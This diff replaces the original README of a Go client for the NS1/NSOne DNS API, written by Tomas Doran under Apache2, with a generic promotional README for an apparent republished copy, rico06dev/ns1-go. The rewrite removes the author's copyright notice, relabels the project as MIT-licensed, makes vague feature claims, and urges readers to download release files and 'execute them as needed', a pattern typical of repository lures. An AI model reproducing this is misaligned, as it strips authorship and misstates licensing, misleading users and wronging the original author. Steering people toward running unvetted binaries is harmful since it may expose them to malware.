@@ -1,140 +1,102 @@
-# go-nsone-api
+# ns1-go 🌐
 
-An *experimental* golang client for the NSOne API: https://api.nsone.net/
+![GitHub release](https://img.shields.io/github/release/rico06dev/ns1-go.svg)
 
-# Example use
+Welcome to the **ns1-go** repository! This project provides a Golang API client for NS1, a leading DNS and traffic management service. With this client, you can easily interact with the NS1 API, enabling you to manage your DNS records and traffic flows programmatically.
 
-    import (
-        "github.com/bobtfish/go-nsone-api"
-    )
+## Table of Contents
 
-    func main() {
-        api := nsone.New("xxxxxxx")
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Reference](#api-reference)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-        ds := nsone.NewDataSource("mydatasource", "nsone_apiv1")
-        err := api.CreateDataSource(ds)
-        if err != nil {
-          panic(err)
-        }
+## Features
 
-        dc1_feed_config := make(map[string]string)
-        dc1_feed_config["label"] = "exampledc1"
-        df_dc1 := nsone.NewFeed(ds.Id)
-        df_dc1.Config = dc1_feed_config
-        err = api.CreateDataFeed(df_dc1)
-        if err != nil {
-            panic(err)
-        }    
+- **Simple API Access**: Interact with NS1's powerful API using straightforward Golang functions.
+- **DNS Record Management**: Create, read, update, and delete DNS records easily.
+- **Traffic Management**: Manage traffic flows and routing policies effectively.
+- **Error Handling**: Built-in error handling to ensure smooth operations.
+- **Comprehensive Documentation**: Detailed documentation to help you get started quickly.
 
-        dc2_feed_config := make(map[string]string)
-        dc2_feed_config["label"] = "exampledc2"
-        df_dc2 := nsone.NewFeed(ds.Id)
-        df_dc2.Config = dc2_feed_config
-        err = api.CreateDataFeed(df_dc2)
-        if err != nil {
-            panic(err)
-        }
+## Installation
 
-        z := nsone.NewZone("foo.com")
-        err = api.CreateZone(z)
-        if err != nil {
-            panic(err)
-        }
+To install the **ns1-go** client, use the following command:
 
-        r := nsone.NewRecord("foo.com", "www.foo.com", "A")
-        answers := make([]nsone.Answer, 2)
-        answers[0] = nsone.NewAnswer
-        answers[1] = nsone.NewAnswer
-        answers[0].Answer = []string{"1.1.1.1"}
-        answers[1].Answer = []string{"1.1.1.1"}
-        answers[0].Answer.Meta["up"] = nsone.NewMetaFeed(df_dc1.Id)
-        answers[1].Answer.Meta["up"] = nsone.NewMetaFeed(df_dc2.Id)
-        r.Answers = answers
-        err = api.CreateRecord(r)
-        if err != nil {
-            panic(err)
-        }
+```bash
+go get github.com/rico06dev/ns1-go
+```
 
-        api.DeleteZone("foo.com")
+This command will download the package and its dependencies.
+
+## Usage
+
+After installation, you can start using the client. Here’s a basic example to get you started:
+
+```go
+package main
+
+import (
+    "fmt"
+    "github.com/rico06dev/ns1-go"
+)
+
+func main() {
+    client := ns1.NewClient("YOUR_API_KEY")
+
+    // Example: Fetch zones
+    zones, err := client.Zones.List()
+    if err != nil {
+        fmt.Println("Error fetching zones:", err)
+        return
     }
 
-# Installing
+    for _, zone := range zones {
+        fmt.Println("Zone:", zone)
+    }
+}
+```
 
-Just checkout this library to your GOPATH as usual. If you're writing a standard go program
-using this library, that should be as simple as saying 'go get'
+Replace `YOUR_API_KEY` with your actual NS1 API key.
 
-# Refernce documentation
+## API Reference
 
-See [the godoc](http://www.godoc.org/github.com/bobtfish/go-nsone-api)
+The API reference documentation is available in the `docs` folder. This includes detailed descriptions of all available methods and their parameters.
 
-# Supported features
+## Examples
 
-## Setup zones
-    * Links supported
-    * Secondary zones supported
-    * Metadata *may* be supported, but is untested
+You can find more examples in the `examples` directory. Here are a few key examples:
 
-## Setup records in those zones
-    * A, MX and CNAME records are supported.
-    * Other record types MAY work, but are untested.
-    * Allows records to be linked to other records
-    * Allows multiple answers, each of which can be linked to a data feed
+1. **Listing DNS Zones**: This example shows how to list all DNS zones in your NS1 account.
+2. **Creating a DNS Record**: This example demonstrates how to create a new DNS record.
+3. **Updating a DNS Record**: Learn how to update existing DNS records.
 
-## Data sources
-    * Can create datasources with arbitrary config
-    * This *should* work for all datasource types, but only nsone_v1 is tested
+## Contributing
 
-## Data feeds
-    * Create data feeds linked to a data source with a label
+We welcome contributions! If you want to contribute to the **ns1-go** project, please follow these steps:
 
-## NSOne monitoring
-    * Retrieve monitoring jobs
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your fork.
+5. Create a pull request.
 
-# Unsupported features
+Please ensure that your code adheres to the existing style and includes tests where applicable.
 
-# Zones
-  * Setting up secondary servers is currently unsupported/untested
+## License
 
-## Records
-  * Static metadata (not linked to a feed) is not yet supported
-  * Filter chains are currently unsupported (Terraform will ignore them if present however - so you can set these up manually)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## NSOne monitoring
-  * 
+## Releases
 
-## Users / Account management / API keys
-  * No support
+For the latest releases, please visit [this link](https://github.com/rico06dev/ns1-go/releases). You can download the necessary files and execute them as needed.
 
-## Useage / querying APIs
-  * No support
+Additionally, you can always check the "Releases" section in this repository for updates.
 
-# Support
+## Conclusion
 
-I'm planning to continue developing and supporting this code for my use-cases (which
-are those of terraform-provider-nsone). I'll try not to break things I don't have to,
-however I'm very likely to have to change some of the structs/functions as I add
-the missing functionality and clean up this library.
-
-If you seriously want to use this code then I recommend vendoring it, until I remove the
-*experimental* notice as the API has stableized.
-
-# Contributions
-
-I'll do my best to respond to issues and pull requests (and I'm happy to take
-patches to improve the code or add missing feaures!).
-
-Also, please be warned that I am *not* a competent Go programmer, so please expect
-to find hideous / insane / non-idiomatic code if you look at the source. I'd be
-extremely happy to accept patches or suggestions from anyone more experience than me:)
-
-Please *feel free* to contract me via github issues or Twitter or irc in #terraform (t0m)
-if you have *any* issues with, or would like advice on using this code.
-
-# Copyright
-
-Copyright (c) Tomas Doran 2015
-
-# LICENSE
-
-Apache2 - see the included LICENSE file for more information
-
+Thank you for checking out **ns1-go**! We hope this client makes your interaction with the NS1 API easier and more efficient. If you have any questions or feedback, feel free to open an issue in this repository. Happy coding!
